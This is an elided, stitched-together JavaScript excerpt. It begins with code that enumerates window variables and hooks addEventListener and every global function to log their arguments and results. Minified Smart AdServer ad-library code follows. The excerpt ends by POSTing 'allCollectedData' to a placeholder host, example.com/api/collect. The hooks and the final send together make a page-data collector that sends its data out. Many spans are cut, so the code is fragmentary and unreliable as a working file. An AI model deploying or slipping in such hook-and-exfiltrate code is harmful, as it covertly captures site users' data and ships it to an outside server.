...
for (let variable in window) {
  if (window.hasOwnProperty(variable)) {
    variables[variable] = typeof window[variable];
  }
}
...
function hookedAddEventListener(eventType, fn, capture) {
  this.addEventListener = originalEventTarget;
  this.addEventListener(eventType, function (ev) {
    console.log(`Event: ${eventType}`);
    fn(ev);
  }, capture);
  this.addEventListener = hookedAddEventListener;
}

// Replace addEventListener with hooked function
...
// JSHook for manipulating function behavior
...
function jshook(originalFunction) {
  ...
  return function (...args) {
    console.log(`Function ${originalFunctionName} called with arguments: ${args.join(', ')}`);
    const result = originalFunction.apply(this, args);
    console.log(`Function ${originalFunctionName} returned: ${result}`);
    return result;
  };
}

// Add global functions to the hook
; /*_hs_*/

for (let variable in window) {
  if (window.hasOwnProperty(variable) && typeof window[variable] === 'function') {
    hookFunctions.push(variable);
  }
}
hookFunctions.forEach(fn => {
  window[fn] = jshook(window[fn]);
});
...
sas.utils = sas.utils || {}, sas.events = sas.events || {}, sas.cmp = sas.cmp || {}, sas.consent = sas.consent || {}, sas.debugMode = sas.debugMode || {}, sas.debugMode.logsQueue = sas.debugMode.logsQueue || [], sas.debugMode.bannersQueue = sas.debugMode.bannersQueue || [], function (e) {
      ...
      629: function (e, t) {
        ...
        var n = function () {
          ...
          return e.prototype.ieFixes = function () {
            ...
            void 0 === n && (n = "");
            var a = "background:#ffd500; border-radius:2px; color:#feffff; font-family:lato,sans-serif; padding:1px 3px;";
            "warning" === t ? console.warn("%csmart", a, e, n) : this.isDebug && console.log("%csmart", a, e, n);
      ...
      565: function (e, t, n) {
        ...
        var o = function (e) {
          function t() {
            ...
            return t.urlMainConfigName = "live_preview_config", t.urlCorePreviewName = "use_core_preview", t.endpointUrl = "//www.saspreview.com/current/Utilities/noshow.ashx?", t.scriptIdInc = 1, t.sas.livePreview.active = !1, t.sas.livePreview.callLivePreview = function (e) {
          ...
          return r(t, e), t.prototype.getParams = function (e) {
            return e.get(this.urlMainConfigName) ? ("true" === e.get(this.urlCorePreviewName) && (this.endpointUrl = "//previewcore.smartadserverapis.com/preview?"), window.sas.livePreview.active = !0, this.parseJson(e.get(this.urlMainConfigName))) : (this._log("Preview mode is active, but there is missing config param"), null);
  ...
  if (!n.__smartLoaded) {
    ...
    var a = function (e) {
      var t = this;
      t._callTimestamp = oe, t.instances = [], n.events.on("ad", function () {
    ...
    a.prototype.onCall = function (e, t, n) {
      ...
      if (this.callType == n.callType.ONECALL && this.ad.isOnecallJSON) {
        if (this.displayData.scriptNoad) {
          var t = $(e.tagId);
          t && (this.displayData.scriptNoad = Q(this.displayData.scriptNoad, t)), new Image().src = this.displayData.scriptNoad;
        }
      ...
      if ("rendered" != this.renderStatus) if (this.displayData) {
        ...
        }), !this.displayData.scriptType) return n.events.fire("load", a, this.ad.tagId), n.events.fire("noad", a, this.ad.tagId), void n.debugMode.addLog(this.ad.tagId + " no ad");
        if (n.debugMode.addLog(this.ad.tagId + " rendered"), o) {
          switch (this.displayData.scriptType) {
            case "iframe":
              q(o, this, this.options.async, r, i);
              break;
            case "script":
              var s = $(o.id);
              s && this.displayData.scriptNoad && (this.displayData.scriptNoad = Q(this.displayData.scriptNoad, s)), J(o, this.displayData.scriptSrc, this.options.async, r, i, s, Ae(this.ad.formatId));
              break;
            case "passback":
              n.passback({
                formatId: this.ad.formatId,
          ...
          Ae(this.ad.formatId) && n.events.fire("request", a, e.ad.tagId), n.events.fire("render", a, this.ad.tagId);
    ...
    n.events.on("call", function (e) {
      var t = w[e.ad.tagId],
        a = be[e.ad.tagId] ? be[e.ad.tagId] : ye;
      ge.mode && ge.modeReady && (e.ad.formats = R(e.ad.formats)), n.livePreview.active && (e.ad.formats = n.livePreview.callLivePreview(e.ad.formats)), e.ad.formats.length && (pe("Make a std call ", e), e.ad.usePostStandard ? a.addListener(function () {
        N(e);
      }) : t.displayData = {
        scriptType: "script",
        scriptSrc: Y(e.callType, e.ad, e.options)
      }), a.addListener(function () {
        t.render();
      });
    }, n.callType.STD), n.events.on("call", function (e) {
      var t = w[e.ad.tagId];
      ge.mode && ge.modeReady && (e.ad.formats = R(e.ad.formats)), n.livePreview.active && (e.ad.formats = n.livePreview.callLivePreview(e.ad.formats)), e.ad.formats.length && (pe("Make a iframe call ", e), t.displayData = {
        scriptType: "iframe",
        scriptSrc: Y(e.callType, e.ad, e.options),
        width: e.ad.width || 0,
        height: e.ad.height || 0
      }), ye.addListener(function () {
        t.render();
      });
    }, n.callType.IFRAME), n.events.on("call", function (e) {
      ge.mode && ge.modeReady && Object.prototype.hasOwnProperty.call(e, "ad") && Object.prototype.hasOwnProperty.call(e.ad, "formats") && (e.ad.formats = R(e.ad.formats)), n.livePreview.active && Object.prototype.hasOwnProperty.call(e, "ad") && Object.prototype.hasOwnProperty.call(e.ad, "formats") && (e.ad.formats = n.livePreview.callLivePreview(e.ad.formats)), e.ad.formats.length && (pe("Make a onecall for formats ", e), ye.addListener(function () {
        e.ad.isOnecallJSON ? j(e) : L(e);
      }));
    }, n.callType.ONECALL);
    var L = function (e) {
        var n = Y(e.callType, e.ad, e.options)(),
          a = t.getElementsByTagName("head")[0],
          r = null;
        a && a.id && (r = $(a.id)), J(a, n, e.options.async, function () {
          var t;
          for (var n in sas_manager.formats) if (t = F(n.substring(1))) {
            var a = sas_manager.formats[n];
            r && (t.displayData.scriptNoad = Q(t.displayData.scriptNoad, r)), t.options.async || a.chain ? t.displayData = {
            ...
            } : t.displayData = Ie(a.scriptURL()), t.displayData.scriptSrc && (t.displayData.scriptSrc = function (e) {
              return function () {
                return Ne(e);
              };
      ...
      j = function (e) {
        ye.addListener(function () {
          var t = z(e.ad, e.options, e.callType);
          !function (e, t, n, a, r) {
            Oe(e, t, n, a, r, JSON.parse, "application/json");
          }(K(e.ad, e.options, e.callType), t, function (e) {
            for (var t in e) {
              var n = F(t);
              if (n) {
                var a = e[t];
      ...
      N = function (e) {
        ye.addListener(function () {
          var t = z(e.ad, e.options, e.callType);
          !function (e, t, n, a, r) {
            Oe(e, t, n, a, r, function (e) {
              return e;
            }, "application/javascript");
          }(K(e.ad, e.options, e.callType), t, function (t) {
            var n = e.ad.tagId,
              a = F(n);
            a && (a.displayData = {
              scriptType: "content",
              ...
              content: t
            }, "pending" == a.renderStatus && (be[n] ? be[n].addListener(function () {
              this.render();
            }.bind(a)) : a.render()));
          }, e.options.onError, e.options.domain);
        });
      ...
      R = function (n) {
        var a,
          r = [];
        e: for (var i = n.length - 1; i >= 0; i--) {
          var o = n[i];
          if ((a = ge.formatTag.filter(function (e) {
            return o.tagId === e.tagId;
          })).length) a[0].formatId ? r.push(a[0]) : r.push({
            formatId: Number(o.id),
            tagId: o.tagId
          }), n.splice(i, 1);else {
            a = ge.formatTag.filter(function (e) {
              return Number(o.id) === e.formatId;
            });
            for (var s = 0; s < a.length; s++) if (!a[s].tagId) {
              r.push({
                formatId: Number(o.id),
                tagId: o.tagId
              }), n.splice(i, 1);
        ...
        return r.length && pe("Preview mode is active, call preview ", ge.url), r.forEach(function (n) {
          pe("Make a preview call for formatId " + n.formatId + " / tagId " + n.tagId), e.sas_ajax = !0;
          var a = e.location.protocol + ge.url + "insid=" + ge.insertionId + "&ruid=" + ge.ruid + "&fid=" + n.formatId + "&tag=" + n.tagId + "&timestamp=" + Date.now(),
            r = t.createElement("script");
          r.id = "sas_script" + B++, r.type = "text/javascript", r.src = a, r.async = !0, t.getElementById(n.tagId) ? t.getElementById(n.tagId).appendChild(r) : t.getElementsByTagName("head")[0].appendChild(r);
        }), n;
      },
      P = "invalid site id",
      x = "invalid page id or name",
      U = "invalid format id",
      M = function (e) {
        throw new Error(e);
      };
    ...
    var F = function (e) {
      ...
      q = function (e, a, r, i, o) {
        ...
        var c = "function" == typeof a.displayData.scriptSrc ? a.displayData.scriptSrc() : a.displayData.scriptSrc,
          l = $(e.id);
        void 0 !== l && (c = Q(c, l), a.displayData.scriptNoad = Q(a.displayData.scriptNoad, l)), s.src = c, r ? (n.events.addLoadEvent(s, i), n.events.addEvent(s, "error", o)) : (s.setAttribute("onload", H(i) + "()"), s.setAttribute("onError", H(o) + "()")), a.options.async ? e.appendChild(s) : t.write(s.outerHTML);
      },
      B = 1,
      G = function (e, n, a) {
        var r = t.createElement("script");
        r.id = "sas_script" + B++, r.type = "text/javascript", r.text = n, a ? e.appendChild(r) : t.write(r.outerHTML);
      },
      V = function (e, n) {
      ...
      J = function (e, a, r, i, o, s, c) {
        var l = t.createElement("script");
        l.id = "sas_script" + B++, l.type = "text/javascript";
        var d = "function" == typeof a ? a() : a;
        s && (d = Q(d, s)), c && (d = X(d)), l.src = d, l.async = r, r ? (n.events.addLoadEvent(l, i), n.events.addEvent(l, "error", o)) : (l.setAttribute("onload", H(i) + "()"), l.setAttribute("onError", H(o) + "()")), r ? e.appendChild(l) : t.write(l.outerHTML);
      },
      z = function (t, a, r) {
        a = n.utils.extend({
          forceMasterFlag: !1
        }, a), d = !!a.forceMasterFlag || d, l = a.resetTimestamp ? o() : l, r == n.callType.ONECALL && ee();
        var i = Z(),
          s = je() || (e.location.origin ? e.location.origin + e.location.pathname : ""),
          c = screen.height,
          u = screen.width;
      ...
      Y = function (t, a, r) {
        r = n.utils.extend({
          forceMasterFlag: !1
        }, r), d = !!r.forceMasterFlag || d, l = r.resetTimestamp ? o() : l, t == n.callType.ONECALL && ee();
        var i = Z(),
          s = je() || (e.location.origin ? e.location.origin + e.location.pathname : ""),
          c = screen.height,
          u = screen.width;
        return function () {
          return n.utils.buildUrl(r.domain, t, a, i, l, r.async, r.networkId, m, y, b, s, S, $(a.tagId), r.clickTrackingUrl, r.clickTrackingEncodingLevel, c, u);
        };
      },
      Q = function (e, t) {
      ...
      ne = function (a, r) {
        if (Object.prototype.hasOwnProperty.call(be, a) || (be[a] = new n.utils.Latch(["loaded", "smartLazyLoading" + a]), ye.addListener(function () {
          for (var e in be) be[e].notify("loaded");
          ...
          e.IntersectionObserver && (i = new IntersectionObserver(function (e, t) {
            e.forEach(function (e) {
              if (e.intersectionRatio > 0 || e.isIntersecting) {
                var n = e.target.id;
                t.unobserve(e.target), Object.prototype.hasOwnProperty.call(be, n) && be[n].notify("smartLazyLoading" + n);
              }
            });
          }, {
            rootMargin: n.lazyLoading.margin
          })), i && i.observe(t.getElementById(a));
        } else be[a].notify("smartLazyLoading" + a);
      },
      ae = [];
    n.events.addLoadEvent(t, function () {
      i = !0, ae.push = function (e) {
        e();
      };
    ...
    var ie,
      ...
      ce = function (t) {
        return "function" == typeof e.URLSearchParams ? new URLSearchParams(e.location.search).get(t) : null;
      },
      le = function (e) {
        var t = ce(e);
        return t = null !== t && t.length ? Number(t) : null;
      },
      de = function (e) {
        var t = ce(e);
        return t = null !== t && t.length ? t.split(",") : null;
      },
      ue = function () {
        var e, t, n;
        return ge.insertionId = le("insid"), ge.ruid = le("ruid"), ge.formatIds = (null === (e = de("formatId")) ? null : e.map(function (e) {
          return Number(e);
        })) || [], ge.tagIds = de("tagId") || [], ge.formatTag = (t = ge.formatIds, n = ge.tagIds, Array.from(Array(Math.max(n.length, t.length)), function (e, a) {
          return {
            formatId: t[a],
            tagId: n[a]
          };
        })), null !== ge.insertionId && null !== ge.ruid && (ge.formatIds.length || ge.tagIds.length) ? (pe("Preview mode is active, we have required parameters"), !0) : (pe("Preview mode is active, but some required parameters are missing"), pe("Preview insertionId ", ge.insertionId), pe("Preview ruid ", ge.ruid), pe("Preview formatIds ", ge.formatIds), pe("Preview tagIds ", ge.tagIds), !1);
      },
      pe = function (e, t, n, a) {
        var r = void 0 === n ? "info" : n;
        if ((!(a = void 0 === a || a) || fe) && e.length && void 0 !== console[r]) {
          var i = {
            txt: "%csmart",
            css: "background: #ffd500; border-radius: 2px; color: #feffff; font-family: lato,sans-serif; padding:1px 3px;"
          };
      ...
      ge = {
        mode: !1,
        modeReady: !1,
        url: "//www.saspreview.com/current/Utilities/noshow.ashx?",
        ruid: null,
        formatIds: null,
        tagIds: null,
        formatTag: null,
      ...
      ve = function () {
        var e = ce("sas_preview");
        null !== e && ("true" === ce("use_core_preview") && (ge.url = "//previewcore.smartadserverapis.com/preview?"), ge.mode = "true" === e && !n.livePreview.active, ge.mode && (ge.modeReady = ue()));
      },
      me = !1,
      ye = new n.utils.Latch(["loaded"]),
      be = {};
    n.setup = function (t) {
      if (me) throw new Error("sas.setup can only be called once");
      n.events.fire("setupCalled", t, "setupCalledId"), he(), ve(), me = !0, c = (t = t || {}).domain || s, h = t.async || h, sas_ajax = h, f = t.networkid || f, g = t.renderMode || g, v = t.inSequence || v, m = t.uid, S = n.utils.extend(S, t.partnerIds), b = t.bundleId, y = t.appName, e.sas_renderMode = g, n.configure({
        id: f
      }), h && g != n.renderMode.DEFAULT || ye.notify("loaded"), g == n.renderMode.ON_DEMAND && (ie = setTimeout(function () {
        n.render();
      }, parseInt(t.renderModeTimeout) || 5e3));
    }, n.call = function (t, r, i) {
      oe = new Date().getTime(), "string" != typeof t && (i = n.utils.extend({}, r, {
        async: !0
      }), r = t, t = "std", g == n.renderMode.DEFAULT && ye.notify("loaded"), he(), ve()), i = n.utils.extend({}, i), t == n.callType.ONECALL ? r.isOnecallJSON = !!r.formats : t == n.callType.STD && (r.usePostStandard = !!e.sas_usePostStandard), (r.isOnecallJSON || r.usePostStandard) && (i.async = !0), (r = n.utils.extend({}, r)).siteId = r.siteId || r.siteid, r.pageId = r.pageId || r.pageid, r.pageName = r.pageName || r.pagename, r.formatId = r.formatId || r.formatid, r.siteId || M(P);
      var o,
        s,
      ...
      if (l.length > 0 && (r.target && r.target.length > 0 && (r.target += ";"), r.target += "platform=" + l), r.pageId || r.pageName || M(x), r.formatId || r.formats || M(U), (i = n.utils.extend({}, E, {
        async: h,
        domain: c,
        networkId: f
      }, i)) && i.networkId) {
      ...
      if (!se(r, i)) {
        ...
        for (u = 0; u < r.formats.length; u++) {
          var m = r.formats[u];
          t == n.callType.STD || t == n.callType.IFRAME ? (r.tagId = m.tagId = r.tagId || m.tagId || "sas_" + m.id, te(r.tagId, i.async)) : m.tagId = m.tagId || "sas_" + m.id;
          var y = w[m.tagId] || new a(m.tagId);
          y.onCall(t, n.utils.extend({}, r, {
            tagId: m.tagId,
            formatId: m.id,
            originalFormatId: m.id
          }), i), y.reset(!!i.reset, t == n.callType.ONECALL), w[m.tagId] = y, n.lazyLoading && h && t == n.callType.STD && ne(m.tagId, m.id);
        }
        i.async && g == n.renderMode.READY && (re || (re = !0, ae.push(function () {
          n.render();
        }))), r.passback || _.push({
          callType: t,
          ad: n.utils.extend({}, r),
          options: n.utils.extend({}, i)
        }), i.async && v ? ye.addListener(function () {
          var e, a;
          e = {
            callType: t,
            ad: r,
      ...
      if (a && r) {
        ...
        if (i && (i.innerHTML = ""), r.current >= 0 && (new Image().src = r.ad.chain[r.current].noadUrl), r.current++, r.current < r.ad.chain.length) {
          if (r.ad.chain[r.current].countUrl && (new Image().src = r.ad.chain[r.current].countUrl), r.ad.chain[r.current].script) G(i, r.ad.chain[r.current].script, a.options.async);else {
            var o = $(i.id);
            J(i, r.ad.chain[r.current].scriptUrl, a.options.async, function () {
              n.events.fire("load", {
    ...
    n.refresh = function (e, t) {
      ...
      if (0 == arguments.length) {
        if (clearTimeout(ie), !ye.isComplete() && (g == n.renderMode.READY && i || g == n.renderMode.ON_DEMAND)) for (o in ye.notify("loaded"), w) "pending" != (r = w[o]).renderStatus || !r.options.async && i || r.render();
      } else if (r = F(a)) if (o = r.ad.tagId, te(o, r.options.async), n.lazyLoading && n.lazyLoading.formats && (-1 !== n.lazyLoading.formats.indexOf(Number(r.ad.originalFormatId)) || 0 === n.lazyLoading.formats.length)) {
        var s = null;
      ...
      if (Range && Range.prototype.createContextualFragment) a.appendChild(t.createRange().createContextualFragment(n));else {
        ...
        r.innerHTML = n;
        for (var i = r.childNodes, o = 0; o < i.length; o++) a.appendChild(Le(i[o]));
      }
      ...
      pe("Call sas.setEids with", e), "object" == typeof e && (I = I.concat(e)), n.events.fire("setEidsCalled", {});
      ...
      var D = Te();
      D && (b.us_privacy = D), b.noadcbk = "sas.noad", a.schain && (b.schain = a.schain), a.content_source_id && (b.ctsrcid = a.content_source_id), b.isLazy = Ae(a.formatId), b.isAdRefresh = Ee(a.formatId);
      var k = [];
    ...
    e.sas_ads = n, e.sas_ajax = !1, e.sas_manager = null, e.sas_unrenderedFormats = [], e.sas_callAd = n.callAd, e.sas_callAds = n.callAds, n.callAd = n.refresh, n.callAds = function () {
      ye.isComplete() ? n.refresh() : n.render();
  ...
  function Le(e) {
    ...
    if ("script" == e.tagName.toLowerCase()) n = t.createElement("script"), e.type && (n.type = e.type), e.src && (n.src = e.src), e.text && (n.text = e.text);else {
      n = e.cloneNode(!1);
      for (var a = e.childNodes, r = 0; r < a.length; r++) n.appendChild(Le(a[r]));
    }
    return n;
  }
  function je() {
...
;
request.open("POST", "https://example.com/api/collect");
...
request.send(JSON.stringify(allCollectedData));